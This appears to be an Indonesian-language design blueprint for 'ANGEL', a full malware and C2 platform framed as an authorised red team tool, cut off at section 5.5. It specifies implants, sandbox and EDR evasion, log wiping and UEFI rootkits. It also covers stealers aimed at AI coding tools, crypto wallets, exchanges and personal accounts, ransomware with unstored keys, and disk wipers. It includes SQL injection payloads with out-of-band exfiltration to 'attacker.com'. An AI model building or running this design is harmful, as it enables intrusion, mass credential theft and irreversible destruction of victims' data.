# ANGEL — BLUEPRINT FINAL v2.1 (LAYER 1-25)

> **Status:** FINAL & EXECUTABLE
> **Tujuan:** Platform offensive security (red team) untuk engagement resmi.
> **Standar:** P0/P1, Hard/Expert, Full Attack, No Demo, No Placeholder.
> **Prinsip:** "No copy-paste" — tiap baris ditulis sendiri.
> **Legalitas:** Hanya digunakan pada sistem yang telah diizinkan.

---

## 1. PENDAHULUAN

### 1.1 Latar Belakang
ANGEL adalah platform offensive security yang dirancang untuk menguji ketahanan infrastruktur dan sistem informasi perusahaan. Platform ini digunakan dalam engagement resmi yang memiliki izin tertulis.

### 1.2 Tujuan
- Mengidentifikasi celah keamanan P0/P1.
- Mendemonstrasikan dampak nyata (RCE, data exfiltration, database compromise).
- Menghasilkan laporan teknis dan eksekutif yang dapat ditindaklanjuti.

### 1.3 Ruang Lingkup
- Target: Infrastruktur, aplikasi web, database, endpoint.
- Metode: Offensive security testing (red team).
- Hasil: Laporan P0/P1 dengan bukti reproduksi.

### 1.4 Legalitas
- Seluruh aktivitas hanya pada sistem yang telah diizinkan.
- Kontrak, izin polisi, dan persetujuan founder telah ditandatangani.

### 1.5 Standar Framework Referensi
- **C2:** Cobalt Strike, Havoc C2, Brute Ratel C4, Nighthawk, Sliver, Aeternum C2
- **Stealer:** Kynx Stealer, Lumma, RedLine, Void Stealer
- **Sleep Masking:** Ekko, Foliage, Cronos, DeathSleep
- **Syscall:** Hell's Gate, Halo's Gate, Tartarus Gate, FreshyCalls, SysWhispers3

---

## 2. ARSITEKTUR

### 2.1 Prinsip Desain
> **"Parallel separation beats serial depth"**

- Setiap komponen terpisah secara fungsional.
- Semua komunikasi antar modul menggunakan event-driven architecture.
- Jika tim blue team menangkap satu node, mereka tidak tahu node lain.

### 2.2 Diagram Arsitektur

```
┌─────────────────────────────────────────────────────────────────────┐
│              LAYER 5: FRONTEND (Angular)                           │
│  - Dashboard (operator monitoring)                                 │
│  - Agent console (task submission, real-time logs)                 │
│  - Report viewer (evidence, chain-of-custody)                      │
└─────────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────────┐
│              LAYER 4: API GATEWAY (.NET 10)                        │
│  - REST API + WebSocket untuk frontend                             │
│  - Authentication + RBAC                                           │
│  - Rate limiting + request validation                              │
└─────────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────────┐
│              LAYER 3: ORCHESTRATOR (LangGraph)                     │
│  - Intent classifier → route ke agent                              │
│  - Multi-agent parallelism (Fireteam mode)                         │
│  - State management (SQLite/PostgreSQL)                            │
│  - Autonomous Decision-Making (Brain)                              │
└─────────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────────┐
│              LAYER 2: C2 FRAMEWORK (Go/Rust)                       │
│  - Implant (Windows/Linux/macOS/Android)                           │
│  - Teamserver (HTTP/HTTPS/WebSocket/DNS/SMB listeners)             │
│  - Malleable C2 Profile (Teams/Office365/Google mimicry)           │
│  - SMB Beacon (lateral movement tanpa internet)                    │
│  - The Decoy (deception layer)                                     │
└─────────────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────────────┐
│              LAYER 1: INFRASTRUCTURE (Terraform/Ansible)            │
│  - VPS provisioning + WireGuard + firewall                         │
│  - Functional Separation (4 VPC nodes)                             │
│  - Nginx redirector (URI routing, decoy)                           │
└─────────────────────────────────────────────────────────────────────┘
```

### 2.3 Mekanisme Fallback Otomatis

```
FALLBACK STATE MACHINE:

┌─────────┐    FAIL    ┌─────────┐    FAIL    ┌─────────┐
│ TECHNIK │ ──────────►│ FALLBACK│ ──────────►│ FALLBACK│
│    A    │            │    B    │            │    C    │
└─────────┘            └─────────┘            └─────────┘
     │                      │                      │
     │ SUCCESS              │ SUCCESS              │ SUCCESS
     ▼                      ▼                      ▼
┌─────────┐            ┌─────────┐            ┌─────────┐
│ COMPLETE│            │ COMPLETE│            │ COMPLETE│
└─────────┘            └─────────┘            └─────────┘

DECISION LOGIC:
IF teknik_A.result == FAIL:
    LOG failure_reason
    IF failure_reason == "DETECTED":
        Mark teknik_A sebagai "burned"
        Pilih teknik dari "undetected" pool
    ELSE IF failure_reason == "BLOCKED":
        Rotasi ke channel/technique berbeda
    ELSE IF failure_reason == "TIMEOUT":
        Retry dengan backoff (1s → 2s → 4s → 8s)
        IF retry_count > 3:
            Pindah ke teknik_B
    ELSE:
        Pindah ke teknik_B
```

### 2.4 Mekanisme Deteksi Environment

```
ENVIRONMENT DETECTION STATE MACHINE:

PHASE 1: STATIC DETECTION (saat implant load)
├── Check OS version: GetVersionExW, RtlGetVersion
├── Check architecture: IsWow64Process
├── Check CPU cores: GetSystemInfo (anti-sandbox: core < 2)
├── Check RAM: GlobalMemoryStatusEx (anti-sandbox: RAM < 2GB)
├── Check disk size: GetDiskFreeSpaceEx (anti-sandbox: disk < 60GB)
├── Check uptime: GetTickCount64 (anti-sandbox: uptime < 5 min)
├── Check mouse: GetCursorPos (anti-sandbox: no movement)
├── Check process count: CreateToolhelp32Snapshot (< 30 = sandbox)
└── Check parent process: NtQueryInformationProcess (explorer.exe parent)

PHASE 2: DYNAMIC DETECTION (saat runtime)
├── Anti-debug:
│   ├── IsDebuggerPresent (PEB.BeingDebugged)
│   ├── CheckRemoteDebuggerPresent
│   ├── NtGlobalFlag (0x70 when debugging)
│   ├── Heap flags (PEB.ProcessHeap.Flags)
│   ├── Timing check: RDTSC (drift > 100ms = debug)
│   ├── Hardware breakpoint: GetThreadContext (DR0-DR7 != 0)
│   └── Trap flag detection
├── Anti-VM:
│   ├── CPUID hypervisor bit (leaf 1, ECX bit 31)
│   ├── MAC address prefix (VMware: 00:0C:29; VBox: 08:00:27)
│   ├── Registry keys: HKLM\SOFTWARE\VMware, VirtualBox
│   ├── Device drivers: vmci.sys, VBoxGuest.sys
│   ├── Process check: vmtoolsd.exe, VBoxService.exe
│   ├── SMBIOS: "VMware", "VirtualBox", "QEMU"
│   ├── HDD model: "VMware", "VBOX", "QEMU"
│   └── BIOS: "BOCHS", "VRTUAL"
├── Anti-sandbox:
│   ├── Cuckoo artifacts: %APPDATA%\Cuckoo
│   ├── Wine detection: wine_get_version
│   └── Firejail: /etc/firejail
├── Anti-EDR:
│   ├── Module enumeration: EnumProcessModules
│   ├── Service enumeration: EnumServicesStatusEx
│   ├── Hook detection: NtCreateFile prologue (FF 25 or E9)
│   └── ETW provider enumeration
└── Anti-network-monitor:
    ├── Proxy detection: WinHTTP WinDetectAutoProxy
    ├── Firewall: netsh advfirewall show allprofiles
    └── Network adapter enumeration
```

### 2.5 Mekanisme Resilience & Recovery

```
EDGE CASE MATRIX:

┌─────────────────────────────────────┬─────────────────────────────────────┐
│ SCENARIO                            │ RESPONSE                            │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ EDR update di tengah engagement     │ 1. Deteksi via hook detection       │
│                                     │ 2. Log "EDR signature changed"      │
│                                     │ 3. Scan undetected technique pool   │
│                                     │ 4. Switch ke teknik undetected      │
│                                     │ 5. Rebuild implant dengan baru      │
│                                     │ 6. Re-deploy via backup channel     │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ C2 channel ke-block                 │ 1. Health check gagal (3x timeout)  │
│                                     │ 2. Log "channel blocked"            │
│                                     │ 3. Rotate ke fallback channel       │
│                                     │ 4. Update DNS records               │
│                                     │ 5. Activate domain fronting         │
│                                     │ 6. Switch ke protocol tunneling     │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Implant ke-detect & quarantine      │ 1. Deteksi via missing heartbeat    │
│                                     │ 2. Operator deploy backup implant   │
│                                     │ 3. Backup via different persistence │
│                                     │ 4. Re-harvest credentials           │
│                                     │ 5. Re-establish C2 channel          │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Persistence kehapus                 │ 1. Watchdog timer check (30s)       │
│                                     │ 2. Re-persist via backup mechanism  │
│                                     │ 3. Log "persistence lost"           │
│                                     │ 4. Alert operator                   │
│                                     │ 5. Re-establish persistence chain   │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Credential ke-rotate                │ 1. Monitor credential change event  │
│                                     │ 2. Re-harvest dari new source       │
│                                     │ 3. Update credential store          │
│                                     │ 4. Re-auth dengan new credentials   │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Network segment berubah             │ 1. ARP table change detection       │
│                                     │ 2. Re-scan network topology         │
│                                     │ 3. Re-route via new path            │
│                                     │ 4. Update pivot tables              │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Operator kehilangan koneksi         │ 1. Implant switch ke autonomous     │
│                                     │ 2. Continue high-value tasks        │
│                                     │ 3. Queue low-risk tasks             │
│                                     │ 4. Maintain heartbeat               │
│                                     │ 5. Resume on reconnect              │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Dead man's switch triggered         │ 1. Heartbeat timeout (configurable) │
│                                     │ 2. Wipe all credentials             │
│                                     │ 3. Delete persistence               │
│                                     │ 4. Clean logs                       │
│                                     │ 5. Self-destruct binary             │
│                                     │ 6. Zero-fill implant memory         │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Memory forensics detected           │ 1. Detect via memory scan timing    │
│                                     │ 2. Relocate implant                 │
│                                     │ 3. Encrypt memory regions           │
│                                     │ 4. Deploy decoy implants            │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Network traffic analysis            │ 1. Morph traffic pattern            │
│                                     │ 2. Rotate encryption keys           │
│                                     │ 3. Switch to covert channel         │
│                                     │ 4. Enable steganography             │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ System reboot                       │ 1. Persistence verified pre-reboot  │
│                                     │ 2. Auto-start via persistence       │
│                                     │ 3. Re-establish C2 channel          │
│                                     │ 4. Re-harvest session tokens        │
├─────────────────────────────────────┼─────────────────────────────────────┤
│ Power loss / BSOD                   │ 1. File-based persistence survives  │
│                                     │ 2. Registry-based persistence       │
│                                     │ 3. Service-based persistence        │
│                                     │ 4. Auto-restart on next boot        │
└─────────────────────────────────────┴─────────────────────────────────────┘

RECOVERY STATE MACHINE:

┌──────────┐    TRIGGER    ┌──────────┐    ACTION    ┌──────────┐
│  NORMAL  │──────────────►│ DETECTED │─────────────►│ RECOVERY │
└──────────┘               └──────────┘              └──────────┘
                                │                         │
                                ▼                         ▼
                          ┌──────────┐            ┌──────────┐
                          │  ISOLATE │            │ RESTORE  │
                          └──────────┘            └──────────┘
                                │                         │
                                ▼                         ▼
                          ┌──────────┐            ┌──────────┐
                          │  CLEANUP │            │  NORMAL  │
                          └──────────┘            └──────────┘
```

---

## 3. MODUL INTI (LAYER 1–5)

### 3.1 C2 Framework

#### Struktur File
```
ANGEL-C2/
├── implant/
│   ├── windows/
│   │   ├── implant_main.go
│   │   ├── implant_config.go
│   │   ├── implant_register.go
│   │   ├── implant_task.go
│   │   ├── implant_result.go
│   │   ├── implant_crypto.go
│   │   ├── implant_sleep.go
│   │   ├── implant_inject.go
│   │   ├── implant_persistence.go
│   │   ├── implant_evasion.go
│   │   └── implant_fallback.go
│   ├── linux/
│   │   ├── implant_main.go
│   │   ├── implant_config.go
│   │   ├── implant_register.go
│   │   ├── implant_task.go
│   │   ├── implant_result.go
│   │   ├── implant_crypto.go
│   │   ├── implant_persistence.go
│   │   └── implant_fallback.go
│   ├── darwin/
│   │   ├── implant_main.go
│   │   ├── implant_config.go
│   │   ├── implant_register.go
│   │   ├── implant_task.go
│   │   ├── implant_result.go
│   │   ├── implant_crypto.go
│   │   ├── implant_persistence.go
│   │   └── implant_fallback.go
│   └── android/
│       ├── implant_main.go
│       ├── implant_config.go
│       ├── implant_register.go
│       ├── implant_task.go
│       ├── implant_result.go
│       ├── implant_crypto.go
│       ├── implant_persistence.go
│       └── implant_fallback.go
├── malleable/
│   ├── profile_loader.go
│   ├── profiles/
│   │   ├── teams.yaml
│   │   ├── office.yaml
│   │   ├── google.yaml
│   │   ├── cloudflare.yaml
│   │   └── profile_validator.go
│   ├── http_get.go
│   ├── http_post.go
│   ├── metadata.go
│   └── tls.go
├── server/
│   ├── listener/
│   │   ├── http.go
│   │   ├── https.go
│   │   ├── websocket.go
│   │   ├── dns.go
│   │   ├── doh.go
│   │   ├── smb.go
│   │   ├── tcp.go
│   │   ├── icmp.go
│   │   ├── telegram.go
│   │   ├── discord.go
│   │   ├── slack.go
│   │   ├── twitter.go
│   │   ├── steam.go
│   │   ├── blockchain.go
│   │   ├── onedrive.go
│   │   ├── gdrive.go
│   │   ├── dropbox.go
│   │   └── listener_manager.go
│   ├── task/
│   │   ├── queue.go
│   │   ├── scheduler.go
│   │   └── result.go
│   ├── crypto/
│   │   ├── ecdh.go
│   │   ├── aes.go
│   │   ├── hmac.go
│   │   └── cert.go
│   ├── database/
│   │   ├── sqlite.go
│   │   ├── models.go
│   │   └── migrations.go
│   └── api/
│       ├── routes.go
│       ├── handlers.go
│       └── middleware.go
├── smb_beacon/
│   ├── smb_beacon.go
│   ├── named_pipe.go
│   └── peer_to_peer.go
├── brain/
│   ├── autonomous_decision.go
│   ├── risk_assessment.go
│   ├── behavior_learning.go
│   └── timing_control.go
├── channel_rotation/
│   ├── rotation_manager.go
│   ├── channel_health.go
│   ├── failover_logic.go
│   └── domain_fronting.go
├── environment_detection/
│   ├── edr_detect.go
│   ├── sandbox_detect.go
│   ├── vm_detect.go
│   ├── debugger_detect.go
│   └── network_monitor_detect.go
├── resilience/
│   ├── dead_man_switch.go
│   ├── self_destruct.go
│   ├── re_persist.go
│   ├── re_harvest.go
│   └── recovery.go
└── console/
    ├── terminal/
    │   ├── main.go
    │   ├── commands.go
    │   └── autocomplete.go
    ├── dashboard/
    │   ├── main.go
    │   ├── agents.go
    │   └── reports.go
    └── api/
        ├── client.go
        └── auth.go
```

#### Teknik Sleep/Masking (11 teknik)

```
1. VIRTUALPROTECT + RC4
   ├── Allocate memory PAGE_NOACCESS
   ├── Encrypt sleep data dengan RC4
   ├── VirtualProtect ke PAGE_READWRITE
   ├── Decrypt data → Execute

2. THREAD STACK SPOOFING
   ├── Allocate new stack
   ├── Copy legitimate stack frame
   ├── Switch RSP ke new stack
   ├── Sleep di new stack
   └── Restore original stack

3. EXCEPTION HANDLER
   ├── Register VEH handler
   ├── Trigger exception (INT3)
   ├── Sleep dalam exception handler
   └── Resume via handler return

4. MODULE STOMPING
   ├── Load legitimate DLL (mshtml.dll)
   ├── Overwrite DLL .text section
   ├── Execute dari overwritten section
   └── Sleep dengan DLL intact

5. CALLBACK-BASED
   ├── QueueUserAPC dengan callback
   ├── Sleep dalam callback
   ├── Timer queue callback
   └── Work item callback

6. GUARD PAGE REMOVAL
   ├── Set PAGE_GUARD pada memory
   ├── Trigger guard page exception
   ├── Sleep dalam exception handler
   └── Remove PAGE_GUARD

7. ENCRYPT FRAGMENTS
   ├── Split code menjadi fragments
   ├── Encrypt setiap fragment dengan key berbeda
   ├── Decrypt fragment saat execute
   └── Re-encrypt setelah execute

8. EKKO-STYLE
   ├── NtCreateEvent
   ├── NtWaitForSingleObject dengan timeout
   ├── Callback ke sleep routine
   └── Resume execution

9. FOLIAGE-STYLE
   ├── Manipulate ETW providers
   ├── Disable ETW logging
   ├── Sleep tanpa ETW trace
   └── Re-enable ETW

10. CRONOS-STYLE
    ├── NtQueueApcThread ke sleeping thread
    ├── APC callback untuk wake
    ├── Thread sleep via Alertable wait
    └── Resume via APC delivery

11. DEATHSLEEP-STYLE
    ├── Manipulate thread context
    ├── Spoof RIP ke sleep gadget
    ├── Actual sleep di different context
    └── Restore context untuk resume
```

**Fallback Chain:**
```
VirtualProtect+RC4 → Thread Stack Spoofing → Module Stomping → Exception Handler →
Callback-based → Ekko-style → Foliage-style → Cronos-style → DeathSleep-style →
Guard Page Removal → Encrypt Fragments → ALERT OPERATOR
```

#### Channel C2 (18+ protokol)

```
1.  HTTPS          — TLS 1.3, JA3 spoofing, /api/v1/telemetry
2.  DNS            — TXT/MX/A records, base32 subdomain encoding
3.  DoH            — Cloudflare/Google/Quad9 DoH
4.  WebSocket      — Persistent, binary frames, ping/pong
5.  SMB            — Named pipe: \\.\pipe\msagent_<random>
6.  TCP Raw        — Custom binary protocol, XOR encryption
7.  ICMP           — Echo request/reply, data in payload
8.  Telegram       — Bot API, chat ID, file upload
9.  Discord        — Webhook, embed-based commands
10. Slack          — Incoming webhook, slash commands
11. Twitter/X      — Tweet-based, DM, steganography
12. Steam Profile  — Display name as command, profile status
13. Blockchain     — Smart contract (Polygon), multi-RPC confirm
14. OneDrive       — File abuse, shared links
15. Google Drive   — File abuse, shared links
16. Dropbox        — File abuse, shared links
17. Domain Fronting— Cloudflare CDN, CloudFront, Azure CDN
18. Legit Service  — Pastebin, GitHub Gist, Notion, Trello
```

**Channel Rotation Logic:**
```
PRIMARY: HTTPS (health check 60s, 3 failures = BLOCKED)
  ↓ FAIL
FALLBACK_1: DNS → FALLBACK_2: DoH → FALLBACK_3: WebSocket →
FALLBACK_4: Telegram → FALLBACK_5: Blockchain →
ALL BLOCKED → Alert operator → Wait guidance
```

#### Test Scenario C2

```
┌────────────────────────┬──────────────────────────────────────────────┐
│ TEST CASE              │ EXPECTED RESULT                             │
├────────────────────────┼──────────────────────────────────────────────┤
│ Implant registration   │ POST /api/v1/register → 201 Created        │
│ Task fetch             │ GET /api/v1/task → 200 OK + encrypted task │
│ Result submission      │ POST /api/v1/result → 200 OK               │
│ Sleep jitter           │ Jitter ±20% dari base sleep                │
│ Channel rotation       │ Failover dalam <5 detik                    │
│ Domain fronting        │ Response identik dengan direct              │
│ Crypto (ECDH)          │ Key exchange <100ms                        │
│ Persistence            │ Reboot survival: 100%                       │
│ Stealth (clean AV)     │ 0% detection                               │
│ Stealth (EDR)          │ <5% detection                               │
│ Memory footprint       │ <50MB RAM                                  │
│ CPU usage              │ <5% average                                 │
│ Network overhead       │ <1KB/s                                     │
│ Reconnection           │ Auto-reconnect <30 detik                   │
│ Dead man switch        │ Trigger dalam 5 menit tanpa heartbeat       │
│ Self-destruct          │ Binary wipe <100ms                          │
│ Environment detect     │ Akurasi >95%                               │
│ Load testing           │ 1000 agents concurrent                     │
└────────────────────────┴──────────────────────────────────────────────┘

ENVIRONMENTS: Windows 10/11, Windows Server 2019/2022, Ubuntu 20.04/22.04,
              CentOS 7/8, Debian 11/12, macOS Ventura/Sonoma, Android 12-14,
              CrowdStrike, SentinelOne, Carbon Black, Defender
```

---

### 3.2 The Decoy / Deception Layer

#### Visitor Routing
```
VISITOR TYPE        → HEADER                    → ROUTE
Agent               → X-Beacon-Token            → /api/v1/*
Operator            → X-Operator-Key            → /admin/*
Scanner (Nmap)      → Tanpa header              → Decoy site
Browser             → Tanpa header              → Decoy site
Default             → Tanpa header              → 404
```

#### Decoy Features
```
├── Realistic HTML/CSS/JavaScript
├── Contact forms (data logging)
├── Login pages (credential harvesting)
├── Blog posts (SEO content)
├── SSL certificates (valid)
├── Responsive design
├── Server: nginx/1.24.0 (spoofed)
└── Analytics tracking
```

---

### 3.3 SQL Injection Engine

#### Detectors (8 methods)
```
1. BOOLEAN-BLIND    — ' AND 1=1-- / ' AND 1=2-- (compare response)
2. TIME-BASED       — SLEEP(5) / pg_sleep(5) / WAITFOR DELAY
3. ERROR-BASED      — EXTRACTVALUE, UPDATEXML, CONVERT
4. UNION-BASED      — ORDER BY → UNION SELECT NULL,NULL,...
5. STACKED QUERIES  — '; SELECT * FROM users--
6. OOB DNS          — LOAD_FILE('\\\\version.attacker.com\\')
7. OOB HTTP         — UTL_HTTP.REQUEST('http://version.attacker')
8. OOB ICMP         — ICMP tunnel exfiltration
```

#### Exploits per DBMS
```
MYSQL:      LOAD_FILE, INTO OUTFILE, sys_exec, UDF inject, user extract
POSTGRESQL: pg_read_file, COPY TO PROGRAM, pg_shadow, file system
MSSQL:      OPENROWSET, xp_cmdshell, CLR assembly, sys.sql_logins
ORACLE:     UTL_FILE, Java stored procedures, DBA_USERS
SQLITE:     load_extension, ATTACH DATABASE, sqlite_master
```

#### WAF Bypass (12 methods)
```
1.  Hex Encoding        — SELECT → 0x53454C454354
2.  Char Function       — SELECT → CHAR(83,69,76,69,67,84)
3.  Unicode Encoding    — %u0053elect
4.  Double URL Encoding — ' → %2527
5.  Case Variation      — SeLeCt, sElEcT
6.  Comment Insertion   — SEL/**/ECT, /*!50000SELECT*/
7.  Whitespace          — %09(tab), %0a(newline), %0b, %0c, %0d, %a0
8.  JSON Body           — {"username":"admin' OR '1'='1"}
9.  GraphQL Parameter   — query { user(username: "...") }
10. XML Parameter       — <username>admin' OR '1'='1</username>
11. Multipart Form      — Boundary manipulation
12. User-Agent Rotation — Rotate UA per request
```

**Fallback:** Hex → Char → Case → Comment → Whitespace → Double URL → Unicode → JSON → GraphQL → XML → Multipart → UA Rotation → ALERT

---

### 3.4 NoSQL Injection Engine

```
MONGODB (6):     auth bypass ($ne/$gt), boolean blind, time-based,
                 JS injection, $lookup exfil, error-based
ELASTICSEARCH (3): query injection, aggregation exfil, script injection
COUCHDB (2):     auth bypass, JS injection
REDIS (2):       command injection, key dump
CASSANDRA (2):   CQL injection, user extract
```

---

### 3.5 Database Post-Exploitation

```
ORACLE:    Java object inject → compile → KhuntCmd → KhuntHash →
           KhuntFS → KhuntUnzip → registry dump
MYSQL:     UDF install → sys_exec/sys_eval → user extract →
           file system → registry dump
POSTGRESQL: COPY TO PROGRAM → user extract (pg_shadow) →
           file system → OS command
MSSQL:     xp_cmdshell → CLR assembly → sys.sql_logins →
           file system → registry dump
COMMON:    backup mechanisms → vault credentials → admin persistence
```

---

## 4. MODUL LANJUTAN (LAYER 6–10)

### 4.1 C2 Evasion & Stealth

#### Syscall (7 methods)
```
1. HELL'S GATE       — PEB walk → ntdll export → SSN extraction
2. HALO'S GATE       — Similar, direct syscall via ntdll stubs
3. TARTARUS GATE     — Manipulate return address → target syscall
4. FRESHYCALLS       — Dynamic SSN extraction runtime
5. SYSWHISPERS3      — Indirect syscall via syscall number
6. INDIRECT SYSCALL  — Call legitimate stub → redirect
7. RECYCLED GATE     — Reuse existing syscall → modify params
```

**Fallback:** Hell's Gate → Halo's → Tartarus → FreshyCalls → SysWhispers3 → Indirect → Recycled → Standard API (higher risk)

#### Anti-Analysis (15 methods)
```
ANTI-DEBUG (5):   IsDebuggerPresent, CheckRemoteDebuggerPresent,
                  NtGlobalFlag, Hardware BP check, Timing (RDTSC)
ANTI-VM (5):      CPUID bit, MAC prefix, Registry keys,
                  Device drivers, Process check
ANTI-SANDBOX (5): Uptime <5min, Mouse no movement, Disk <60GB,
                  Core <2, RAM <2GB
```

#### Process Injection (7 methods)
```
1. CRT              — CreateRemoteThread
2. APC              — QueueUserAPC
3. PROCESS HOLLOWING— CreateProcess SUSPENDED → Unmap → Write → Resume
4. THREAD HIJACKING — SuspendThread → SetThreadContext → ResumeThread
5. MODULE STOMPING  — Load DLL → Overwrite .text → Execute
6. REFLECTIVE DLL   — Load DLL from memory
7. SECTION MAPPING  — CreateFileMapping → MapViewOfSection
```

#### Log Cleanup
```
wevtutil clear → Audit clear → USN journal clear →
Prefetch clear → Shell history clear → Forensic artifacts clear
```

#### Network Evasion
```
IP rotation (1-3s) → Proxy chain → UA rotation →
TLS fingerprint rotation → DNS rotation → VPN
```

---

### 4.2 Kerberos & Active Directory Attack

#### Kerberos (12 methods)
```
1.  GOLDEN TICKET    — KRBTGT hash → domain-wide, 10yr lifetime
2.  SILVER TICKET    — Service hash → single service access
3.  DIAMOND TICKET   — Modify PAC pada legitimate TGT
4.  SAPPHIRE TICKET  — Modify TGT directly
5.  SHADOW CRED      — msDS-KeyCredentialLink manipulation
6.  KERBEROAST       — TGS request → offline crack (hashcat -m 13100)
7.  AS-REP ROAST     — No preauth → AS-REP → crack (hashcat -m 18200)
8.  PASS-THE-TICKET  — Extract TGT → inject
9.  OVERPASS-HASH    — NTLM hash → TGT
10. TICKET INJECT    — klist add / Rubeus import
11. TICKET DUMP      — Mimikatz kerberos::list
12. SKELETON KEY     — Patch lsass → universal password "mimikatz"
```

#### ADCS (16 ESC)
```
ESC1:  Misconfigured template (client auth + SAN + low-priv enroll)
ESC2:  Any Purpose EKU
ESC3:  Certificate Request Agent EKU
ESC4:  Vulnerable template ACL
ESC5:  Vulnerable CA ACL
ESC6:  EDITF_ATTRIBUTESUBJECTALTNAME2
ESC7:  ManageCA/ManageCertificates rights
ESC8:  HTTP enrollment + NTLM relay
ESC9:  No security extension
ESC10: Weak certificate mapping
ESC11: Relay to NTLM enrollment
ESC12: Relay to HTTP enrollment
ESC13: Vulnerable application policy
ESC14: Certificate mapping vulnerability
ESC15: Schannel elevation
ESC16: Security extension bypass
```

#### AD Recon (8 modules)
```
Domain enum → User enum → Group enum → SPN enum →
GPO enum → OU enum → Trust enum → Site enum
```

#### AD Exploit
```
DCSync (DRSUAPI + replication + VSS) → AdminSDHolder →
Delegation (constrained/unconstrained/resource-based) → ZeroLogon
```

---

### 4.3 Lateral Movement

```
SMB (8):   PsExec, SMBExec, AtExec, WmiExec, DCOMExec,
           Service, Named Pipe, Pass-the-Hash
SMB BEACON (2): Named Pipe, P2P
WMI (4):   Enum, Auth, Exec, Persist
WinRM (3): Auth, Exec, Shell
DCOM (4):  MMC20, ShellWindows, Excel, Outlook
RDP (5):   Auth, Connect, Tunnel, Session Hijack, Shadow
SSH (3):   Auth, Exec, Tunnel
PS REMOTE (3): Session, Exec, ScriptBlock
PIVOT (5): SOCKS5, Port Forward, TCP/DNS/ICMP Tunnel
```

**Fallback:** PsExec → WMI → WinRM → DCOM → RDP → SSH → PS Remoting

---

### 4.4 Persistence

```
WINDOWS (11):  Registry, Scheduled Task, Service, WMI, Startup Folder,
               ADS, DLL Sideload, COM Hijack, AppInit, IFEO, Accessibility
LINUX (9):     Cron, Systemd, rc.local, Profile, Bashrc, SSH Keys,
               PAM, Udev, Initramfs
MACOS (6):     LaunchDaemons, LaunchAgents, Cron, SSH Keys,
               Login Items, Kext
ANDROID (5):   Magisk Module, BOOT_COMPLETED, Foreground Service,
               Device Admin, Accessibility
RE-PERSIST (3): Watchdog, Auto-reinstall, Backup persistence
```

**Re-persist:** Monitor persistence setiap 30 detik → jika hilang → auto-reinstall dari backup mechanism

---

### 4.5 Hardware Rootkit

```
UEFI (9):   DXE Driver, Boot Chain Hook, OSL Hook, CM Hook,
            Secure Boot Bypass (MOK/shim/dbx), MOK Enroll,
            Self-reinstall, ESP Persistence, Shim Exploit
SMM (5):    Handler Inject, SMRAM Exploit, ROP Chain,
            Interrupt Hook, Self-reinstall
FIRMWARE (5): SPI Flash Read/Write, JTAG Debug,
              UART Console, Firmware Emulation
```

---

## 5. MODUL OFENSIF (LAYER 11–15)

### 5.1 Credential Theft

```
LSASS (7):    Fork Dump, Minidump, Procdump, Nanodump,
              PPL Bypass, SSP Injection, Hooking
SAM (3):      Registry Dump, Hive Extract, VSS Extract
BROWSER (5):  Chrome, Firefox, Edge, Brave, Opera
DEV TOOLS (5): Claude Code, Cursor, GitHub Copilot, Windsurf, VS Code
CRYPTO (84+): 65+ browser extension wallets (MetaMask, Phantom, etc.)
              19+ desktop wallets (Exodus, Atomic, Electrum)
GAMING (16+): Steam, Epic, Origin, Roblox, etc.
VPN (9+):     NordVPN, ExpressVPN, Surfshark, etc.
CLOUD (6):    AWS credentials/metadata, Azure MSAL/CLI, GCP ADC/CLI
TOKEN (3):    Impersonation, Delegation, Primary
CERT (2):     Store, Smartcard
SESSION (4):  Instagram, TikTok, X, Spotify
MFA (1):      TOTP/HOTP Token Harvester
BIOMETRIC (3): FaceID, TouchID, Fingerprint
EXCHANGE (4): Coinbase, Binance, Kraken, Bybit
FALLBACK (4): MCE → DBS → ChromeElevator → RawCopy
```

---

### 5.2 Collector / InfoStealer

```
BROWSER (4):  Chrome, Firefox, Edge, Opera — password recovery
SCREEN (2):   Capture (JPEG/PNG), Record (MP4)
KEYLOG (1):   Keystroke capture (real-time)
WIFI (1):     netsh wlan show profile
WEBCAM (1):   Photo capture
MICROPHONE (1): Audio recording
CLIPBOARD (1): Clipboard monitoring
FILE GRABBER (4): Document (PDF/DOCX/XLSX), Email (PST/OST),
                  Chat (Discord/Slack), Messaging (WhatsApp/Signal)
NETWORK (1):  Packet capture (PCAP)
```

---

### 5.3 Destruction & Impact

```
DATABASE (6):   DROP SCHEMA, DROP FK, AES_ENCRYPT (JADEPUFFER),
                Corrupt Data (MAD-CAT), Delete Backup, Disable Recovery
RANSOMWARE (4): Encrypt Files, Encrypt Database, Ransom Note,
                Key Destroy (NOT STORED)
WIPER (7):      Zero Overwrite (Lotus), Random (PathWiper),
                MBR Destroy, MFT Destroy, Volume Dismount,
                Restore Point Delete, USN Journal Clear
AVAILABILITY (3): Service Stop, Process Kill, Network Flood
IMPACT (4):     Blast Radius, Recovery Time, Business Impact, P0/P1 Scoring

TIMING CHAIN: Credential (5m) → Exfil (10m) → DB Destroy (2m) →
              File Encrypt (5m) → Log Cleanup (3m) → Self-destruct (1m)
              Total: ~26 minutes
```

---

### 5.4 Orchestrator

```
CORE:        Main, Config, State
ROUTER:      Intent Classifier → Action Selector → Task Dispatcher
AGENTS:      Recon, Exploit, PostExploit, Lateral, Destruction
FIRETEAM:    Parallel multi-agent execution
GRAPH:       Neo4j (attack surface), Attack Path, Blast Radius
MCP:         Metasploit, Hydra, Playwright, Kali Shell,
             Nmap, Nuclei, FFuf
AI:          LangGraph, ReAct Pattern, Hypothesis Generator,
             Empirical Validation
```

**Decision Tree:**
```
User Request → Intent Classify → Risk Assessment:
  Score < 30: AUTO EXECUTE
  Score 30-70: REQUEST APPROVAL
  Score > 70: BLOCK + ALERT
  Destructive: ALWAYS REQUEST APPROVAL
```

---

### 5.5 Autonomous Decision-Making (Brain)

```
